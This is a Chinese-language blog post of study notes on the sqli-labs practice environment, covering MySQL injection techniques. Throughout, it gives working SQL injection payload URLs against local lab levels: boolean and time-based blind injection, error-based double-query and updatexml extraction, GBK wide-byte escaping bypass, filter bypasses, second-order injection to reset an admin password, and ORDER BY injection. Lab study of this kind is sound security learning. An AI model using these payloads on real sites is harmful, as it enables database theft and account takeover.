---
title: sqli-lab学习心得总结
date: 2017-12-10 09:53:22
tags:
    - web安全
---

## 0x00

从sqli-lab入门Mysql注入。总结记录下我学到的知识点。

## 0x01 注入步骤

-   查看当前的用户名，数据库和版本号。user(),datebase(),version()
-   从`information_schema`中获取数据库、数据表的信息。
-   拖库或传Shell

## 0x02 盲注技巧

### BoolenBased

*当参数传递正确或错误时页面的返回结果不同时，可以用这种方法。速度比TimeBased快很多。*

payload:`ascii(substr((select database()),1,1))>64`

`if(a,b,c)`：a为条件，a为true，返回b，否则返回c，如if(1>2,1,0),返回0。`substr()`截取字符串，第一个参数截取字符串，第二个参数是起始位置，第三个参数是截取长度。每次查询一位，根据返回的结果判断查询条件，利用二分法查询。

`substr(str,pos,len)`：str从pos位置开始截取len长度的字符进行返回.。注意这里的pos位置是从1开始的，不是数组的0开始

### TimeBased

*当参数传递正确或错误时页面的返回结果相同时，可以用这种方法。速度比TimeBased快很多。*

payload:`SLEEP(time)`、`BENCHMARK(count, expr)`

`SLEEP(time)`使程序等待time秒，`BENCHMARK（count,expr）`执行expr指令count次。这两个函数可以用来结合if()、ascii()、substr()等函数可以构造时间注入。

## 0x03 双查询

*适用于基于报错的某些情况下,联合查询不会直接回显查询结果时，我们可以利用双查询，把想要的信息通过报错返回。 //如Less-6*

#### 双查询使用的四个函数

-   Rand() //随机函数
-   Floor() //取整函数
-   Count() //汇总函数
-   Group by clause //分组函数

payload:`select count(*), concat((select version()), floor(rand()*2))as a from information_schema.tables group by a;`

当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。

以Less-6举例

源码：

![](/img/sql/err.png)

payload:

> http://localhost/Less-6/?id=0%22%20union%20select%201,count(*),%20concat(%27\~%27,(select%20user()),%27\~%27,%20floor(rand()*2))as%20a%20from%20information_schema.tables%20group%20by%20a--+

result：

![](/img/sql/err1.png)

在payload加入`concat()`是为了便于区分，同时避免有些时候返回结果显示不完全的情况。

## 0x04 其他基于报错的注入函数

*适用情况跟双查询相同*

payload:`updatexml()`/`extractvalue()`

`UPDATEXML (XML_document, XPath_string, new_value);`

-   第一个参数：XML\_document是String格式，为XML文档对象的名称，文中为Doc
-   第二个参数：XPath\_string (Xpath格式的字符串)
-   第三个参数：new\_value，String格式，替换查找到的符合条件的数据
-   作用：改变文档中符合条件的节点的值

`extractvalue()`和前者类似。

同以Less-6举例

payload：

> http://localhost/Less-6/?id=0%22%20or%20updatexml(1,concat(%22:%22,version(),1),1)%20--+

result：

![](/img/sql/err2.png)

## 0x05 绕过技巧

### 宽字节注入

*对于那些使用gbk编码的页面，当源码对输入进行加斜杆的转义时,可以使用宽字节注入绕过。*

以Less-33举例：

参数被addslashes函数转义。

payload:

> http://localhost/Less-32/?id=0%df%27%20union%20select%201,2,3%20--+

由于mysql的特性，因为gbk是多字节编码，他认为两个字节代表一个汉字，所以%df和后面的\也就是%5c变成了一个汉字“運”，而’逃逸了出来。

### or/and 绕过

-   `||`=or,`&&`=and
-   双写绕过，如oorr\aandnd

### 空格绕过

-   / \*\*/绕过
-   %a0绕过

%a0绕过原理：在进行正则匹配时，匹配到它时是识别为中文字符的，所以不会被过滤掉，但是在进入SQL语句后，Mysql是不认中文字符的，所以直接当作空格处理，就这样，我们便达成了Bypass的目的，成功绕过空格+注释的过滤

### 二次注入

*利用源码的逻辑错误注入*

以Less-24举例

源码：

![](/img/sql/two.png)

一个登录系统，在注册、登陆等环节都使用了`mysql_real_escape_string`函数转义，但是在如图所示的更改密码时没有检测username,我们可以利用这个逻辑错误修改一些可能存在的常见用户名（如admin、root）的密码。

以修改admin用户密码举例，注册一个用户

> username：admin’ –+
>
> password: 123

它在php里会被转义，但是存进数据库时还是原始值

![](/img/sql/user1.png)

然后修改密码

![](/img/sql/user2.png)

## 0x06 ORDERBY从句注入技巧

orderby注入有独特的判断方法。注入的思路和之前区别不大，但是一些函数使用上有些区别。

以Less-46举例

源码：

![](/img/sql/order1.png)

### 简单判断

paylaod:

> http://localhost/Less-46/?sort=1%27%20or%201=1%20--+
>
> http://localhost/Less-46/?sort=1%20%20or%201=1%20--+
>
> http://localhost/Less-46/?sort=1%20%20desc

`desc`/`asc`观察回显的顺序，判断是否有orderby从句的注入点

### 基于报错

payload:

> http://localhost/Less-46/?sort=1%20or%20%20updatexml(1,concat(0x2829,version()),1)%20--+

### 盲注

#### BoolenBased

> http://localhost/Less-46/?sort=(select+1+regexp+if(substring(database(),1,1)=0x73,1,0x00

`regexp`正则匹配函数

1与if语句正则匹配，database()第一个字符=0x73为真则if为1，则regexp匹配结果为1，否则为0。

#### TimeBased

> 5,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test))

## Refer:

-   [双查询](https://www.2cto.com/article/201303/192718.html "双查询")
-   [宽字节注入](https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html "宽字节注入")
-   [orderby从句注入](https://www.secpulse.com/archives/57197.html "orderby从句注入")


